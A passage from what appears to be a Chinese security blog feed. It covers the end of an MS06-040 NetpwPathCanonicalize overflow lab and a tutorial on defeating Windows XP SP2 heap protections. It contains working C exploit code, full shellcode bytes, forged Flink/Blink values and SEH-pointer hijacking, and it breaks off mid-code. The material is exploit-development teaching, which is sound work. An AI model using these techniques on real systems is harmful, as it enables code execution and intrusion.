class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将ShellCode拷贝到缓冲区中</span></span><br><span class="line"><span class="built_in">memcpy</span>(PathName1, ShellCode, <span class="keyword">sizeof</span>(ShellCode));</span><br><span class="line"><span class="comment">// 将ShellCode后面的0x00填充为0x90</span></span><br><span class="line">PathName1[<span class="keyword">sizeof</span>(ShellCode)<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 将返回地址覆盖为jmp ebp 71BBFCBE</span></span><br><span class="line">PathName2[<span class="number">0x296</span>] = <span class="number">0xBE</span>;</span><br><span class="line">PathName2[<span class="number">0x297</span>] = <span class="number">0xFC</span>;</span><br><span class="line">PathName2[<span class="number">0x298</span>] = <span class="number">0xBB</span>;</span><br><span class="line">PathName2[<span class="number">0x299</span>] = <span class="number">0x71</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，运行，又是我们熟悉的对话框。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717230456660.png" alt="image-20220717230456660"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;rpc-漏洞&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rpc-漏洞&quot;&gt;&lt;/a&gt; RPC 漏洞&lt;/h1&gt;
&lt;h2 id=&quot;rpc-漏洞简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hre</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>重重保护下的堆</title>
    <link href="https://www.rgzzplus.com/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/"/>
    <id>https://www.rgzzplus.com/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/</id>
    <published>2022-07-06T15:12:30.000Z</published>
    <updated>2022-08-01T11:17:34.263Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="堆保护机制的原理"><a class="markdownIt-Anchor" href="#堆保护机制的原理"></a> 堆保护机制的原理</h1><p>堆中的安全校验操作</p><ul><li>**PEB random：**在 Windows XP SP2 之后不再使用固定的 PEB 基址 0x7ffdf000，而是使用具有一定随机性的 PEB 基址。Matt C onover  指出这种变动只是在 0x7FFDF000~0x7FFD4000 之间移动。覆盖 PEB 中函数指针的利用方式请参见 “堆溢出利用（下）”中的实验和“攻击 PEB 中的函数指针” 的相关介绍。</li><li><strong>Safe Unlink：</strong> 微软改写了操作双向链表的代码，在卸载 free list 中的堆块时更加小心。</li></ul><p>对照“堆溢出利用（上）——DWORD SHOOT”中关于双向链表拆卸问题的描述，在 SP2 之前的链表拆卸操作类似于如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">    node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SP2 之后在进行删除操作时，将提前验证堆块前向指针和后向指针的完整性，以防止发生DWORD SHOOT：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">safe_remove</span> <span class="params">(ListNode * node)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( (node-&gt;blink-&gt;flink==node)&amp;&amp;(node-&gt;flink-&gt;blink==node) )</span><br><span class="line">    &#123;</span><br><span class="line">        node -&gt; blink -&gt; flink = node -&gt; flink;</span><br><span class="line">        node -&gt; flink -&gt; blink = node -&gt; blink;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        链表指针被破坏，进入异常</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>heap cookie：</strong> 与栈中的 security cookie 类似，微软在堆中也引入了 cookie，用于检测堆溢出的发生。cookie 被布置在堆首部分原堆块的 segment table 的位置，占 1 个字节大小。</li></ul><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220629221905143.png" alt="image-20220629221905143" style="zoom: 80%;"><ul><li><strong>元数据加密：</strong> 微软在 Windows Vista 及后续版本的操作系统中开始使用该安全措施。块首中的一些重要数据在保存时会与一个 4 字节的随机数进行异或运算，在使用这些数据时候需要再进行一次异或运行来还原。</li></ul><h1 id="攻击堆中存储的变量"><a class="markdownIt-Anchor" href="#攻击堆中存储的变量"></a> 攻击堆中存储的变量</h1><p>堆中的各项保护措施是对堆块的关键结构进行保护，而对于堆中存储的内容是不保护的。如果堆中存放着一些重要的数据或结构指针，如函数指针等内容，通过覆盖这些重要的内容还是可以实现溢出的。这种攻击手段与堆保护措施没有什么联系，所以我们在这就不过多讨论了。</p><h1 id="利用-chunk-重设大小攻击堆"><a class="markdownIt-Anchor" href="#利用-chunk-重设大小攻击堆"></a> 利用 chunk 重设大小攻击堆</h1><p>Safe Unlink 精髓之处在于从 FreeList[n]上拆卸 chunk 时对双向链表的有效性进行验证。但对于插入 chunk 却没有校验。</p><p>链表中会发生插入操作的情况：<br>（1）内存释放后 chunk 不再被使用时它会被重新链入链表。<br>（2）当 chunk 的内存空间大于申请的空间时，剩余的空间会被建立成一个新的 chunk，链入链表中。</p><p>从 FreeList[0]上申请空间的过程：<br>（1）将 FreeList[0]上最后一个 chunk 的大小与申请空间的大小进行比较，如果 chunk 的大小大于等于申请的空间， 则继续分派，否则扩展空间（若超大堆块链表无法满足分配，则扩展堆）。<br>（2）从 FreeList[0]的第一个 chunk 依次检测，直到找到第一个符合要求的 chunk，然后将其从链表中拆卸下来（搜索恰巧合适的堆块进行分配）。<br>（3）分配好空间后如果 chunk 中还有剩余空间，剩余的空间会被建立成一个新 chunk，并插入到链表中（堆块空间过剩则切分之）。</p><p>在这三个步骤中，第一步我们没有任何利用的机会。由于 Safe Unlink 的存在，如果我们去覆盖 chunk 的结构在第二步的时候就会被检测出来，这么看来我们没有任何利用的机会。但是 Safe Unlink 中存在一个让人疑惑的问题，即便 Safe Unlink 检测到 chunk 结构已经被破坏，它还是会允许后续的一些操作执行，例如重设 chunk 的大小。</p><h2 id="分析重设-chunk-的具体过程"><a class="markdownIt-Anchor" href="#分析重设-chunk-的具体过程"></a> 分析重设 chunk 的具体过程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HLOCAL h1;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">0x10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP Pro SP2</td></tr><tr><td>编译环境</td><td>VC++ 6.0</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><blockquote><p>说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。</p></blockquote><p>调试观察内存状态，可以看到堆的起始地址为 0x00390000（ EAX 的值）， FreeList[0]位于0x00390178，在 0x00390178 处可以看到唯一的 chunk 位于 0x00390688。此时 FreeList[0]头节点和 chunk 如图 15.3.1 所示。</p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220630084013720-16565496150431.png" alt="image-20220630084013720" style="zoom:67%;"><p>接下来分析将新 chunk 插入链表的过程。在 0x7C931513 的位置下设断点，这是修改 chunk 中下一chunk 指针和上一 chunk 指针的开始。该地址为 ntdll 加载基址+0x11513，如果您的实验环境地址有所变化，请用此方法自行确认。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220630130833605.png" alt="image-20220630130833605"></p><p>新 chunk 插入链表的过程：</p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702091757067.png" alt="image-20220702091757067" style="zoom: 20%;"><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220630131045186.png" alt="image-20220630131045186"></p><p>新chunk 插入过程归纳：<br>新 chunk-&gt;Flink=旧 chunk-&gt;Flink<br>新 chunk-&gt;Blink=旧 chunk-&gt;Flink-&gt;Blink<br>旧 chunk-&gt;Flink-&gt;Blink-&gt;Flink=新 chunk<br>旧 chunk-&gt;Flink-&gt;Blink=新 chunk</p><p>插入完成后，观察FreeList[0]的链表结构<br><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702081704143.png" alt="image-20220702081704143"></p><p>考虑下如果将旧 chunk 的 Flink 和 Blink 指针都覆盖了会出现情况呢？例如，我们将旧 chunk 的 Flink 指针覆盖为 0xAAAAAAAA，Blink 指针覆盖为 0xBBBBBBBB，套用我们前面归纳的公式，可以得出如下结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x003906A0</span>]=<span class="number">0xAAAAAAAA</span></span><br><span class="line">[<span class="number">0x003906A0</span>+<span class="number">4</span>]=[<span class="number">0xAAAAAAAA</span>+<span class="number">4</span>]</span><br><span class="line">[[<span class="number">0xAAAAAAAA</span>+<span class="number">4</span>]]=<span class="number">0x003906A0</span></span><br><span class="line">[<span class="number">0xAAAAAAAA</span>+<span class="number">4</span>]=<span class="number">0x003906A0</span></span><br></pre></td></tr></table></figure><p>这实际上是一个向任意地址写入固定值的漏洞（DWORD SHOOT），而 Safe Unlink 的验证的不严密性却能执行这个 DWORD SHOOT。如果将内存中的某个函数指针或者 S.E.H 处理函数指针覆盖为 shellcode 的地址，不就可以实现溢出了吗？</p><blockquote><p>注意： 0xAAAAAAAA+4 必须指向可读可写的地址，而 0xAAAAAAAA+4 中存放的地址必须指向可写的地址，否则会出现异常。</p></blockquote><h2 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x10\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line">    <span class="string">&quot;\xEB\x06\x39\x00\xEB\x06\x39\x00&quot;</span><span class="comment">//覆盖 Flink 和 Blink</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xEB\x31\x90\x90\x90\x90\x90\x90&quot;</span><span class="comment">//跳转指令，跳过下面的垃圾代码</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x11\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8C\x06\x39\x00\xE4\xFF\x12\x00&quot;</span><span class="comment">//伪造的 Flink 和 Blink</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line">    HLOCAL h1,h2;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(h1,shellcode,<span class="number">300</span>);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,zero);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路</h2><p>（1）首先 h1 向堆中申请 16 个字节的空间。<br>（2）由于此时堆刚刚初始化所以空间是从 FreeList[0]中申请的，从 FreeList[0]中拆卸下来的 chunk 在分配好空间后会将剩余的空间新建一个 chunk 并插入到 FreeList[0]中， 所以 h1 后面会跟着一个大空闲块。<br>（3）当向 h1 中复制超过 16 个字节空间时就会覆盖后面 chunk 的块首。<br>（4） Chunk 的块首被覆盖后，当 h2 申请空间时，程序就会从被破坏的 chunk 中分配空间，并将剩余空间新建为一个 chunk 并插入到 FreeList[0]中。<br>（5）通过伪造 h2 申请空间前 chunk 的 Flink 和 Blink，实现在新 chunk 插入 FreeList[0]时将新 chunk 的 Flink 起始地址写入到任意地址。因此通过控制 h2 申请空间前 chunk 的 Flink 和Blink 值，可以将数据写入到异常处理函数指针所在位置。<br>（6）通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode 执行。</p><table><thead><tr><th></th><th style="text-align:left">推荐使用的环境</th></tr></thead><tbody><tr><td>操作系统</td><td style="text-align:left">Windows XP Pro SP2</td></tr><tr><td>编译环境</td><td style="text-align:left">VC++ 6.0</td></tr><tr><td>build 版本</td><td style="text-align:left">release 版本</td></tr></tbody></table><blockquote><p>说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。</p></blockquote><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h2><h3 id="构造填充字符串"><a class="markdownIt-Anchor" href="#构造填充字符串"></a> 构造填充字符串</h3><p>（ 1）先用16个 \x90 填充shellcode，然后编译运行调试。待程序在 0x00401050 处中断后观察内存状态。</p><p>h1 的数据部分起始地址为 0x00390688，后面 chunk 的 Flink 位于 0x003906A0，因此需要 32 个字节的字符串就可以覆盖掉 h1 后面 chunk 的 Flink 和 Blink（通过分析堆结构也可计算出填充字符串的长度）。现在需要选择一些内存地址来填充 Flink 和 Blink，在这我们不妨用 0x003906EB 分别填充 Flink 和 Blink。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702100441747.png" alt="image-20220702100441747"></p><blockquote><p>思考： 为什么要使用 0x003906EB？大家看看 0xEB06 眼熟不？对，这是一个短跳转指令，稍后我们会再次解释如何用短跳指令越过垃圾代码，到达 shellcode。</p></blockquote><p>（ 2）确定[Flink]和[Flink+4]的值。覆盖程序的默认异常处理函数句柄，让[Flink+4]=0x0012FFE4，而[Flink] 对于我们来说没有什么作用，所以随便填充一些内容即可，当然为了防止在某个没有分析到的地方使用这个地址，在这设置为 0x0039068C。</p><p>当 h2 申请空间后就会发生以下事情：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x003906B8</span>]=<span class="number">0x003906EB</span></span><br><span class="line">[<span class="number">0x003906B8</span>+<span class="number">4</span>]=<span class="number">0x0012FFE4</span></span><br><span class="line">[<span class="number">0x0012FFE4</span>]= <span class="number">0x003906B8</span></span><br><span class="line">[<span class="number">0x003906EB</span> +<span class="number">4</span>]=<span class="number">0x003906B8</span></span><br></pre></td></tr></table></figure><p>重新布置 shellcode 验证分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x10\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x06\x39\x00\xEB\x06\x39\x00&quot;</span><span class="comment">//覆盖原始 chunk 中的 Flink 和 Blink</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x31\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\x8C\x06\x39\x00\xE4\xFF\x12\x00&quot;</span><span class="comment">//伪造的 Flink 和 Blink</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>编译调试运行，在为 h2分配内存的heapalloc() 中的 0x7C93152F 处，即所有 Flink 和 Blink 调整完成后，观察堆块状态。与我们的分析一致。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702124629054.png" alt="image-20220702124629054"></p><h3 id="布置-shellcode"><a class="markdownIt-Anchor" href="#布置-shellcode"></a> 布置 shellcode</h3><p>将谈对话框的机器码放在 0x003906F3 的位置，即伪造的 Flink 和 Blink 后面，并在前面的 0x90 填充区放置短跳转指令来跳过伪造的 Flink 和 Blink，防止它们对程序执行产生影响。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702125031511.png" alt="image-20220702125031511"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x10\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x06\x39\x00\xEB\x06\x39\x00&quot;</span><span class="comment">//覆盖 Flink 和 Blink</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x31\x90\x90\x90\x90\x90\x90&quot;</span><span class="comment">//跳转指令，跳过下面的垃圾代码</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\x8C\x06\x39\x00\xB4\xFF\x12\x00&quot;</span><span class="comment">//伪造的 Flink 和 Blink</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>将程序中的 shellcode 按照上面的布局设置，去掉 INT 3，重新编译程序。弹出异常对话框，直接点击 “调试”，就能看到 failwest 对话框了。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702131040537.png" alt="image-20220702131040537"></p><h1 id="利用-lookaside-表进行堆溢出"><a class="markdownIt-Anchor" href="#利用-lookaside-表进行堆溢出"></a> 利用 Lookaside 表进行堆溢出</h1><p>Safe Unlink 对空表中双向链表进行了有效性验证，而对于快表中的单链表是没有进行验证的，所以我们可以利用快表进行堆溢出。</p><p>从快表中拆卸结点过程：<br><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220703071212958.png" alt="image-20220703071212958" style="zoom: 67%;"></p><p>与前面一样，利用链表拆卸过程中的指针伪造思路。</p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220703071428228.png" alt="image-20220703071428228" style="zoom:80%;"><h2 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 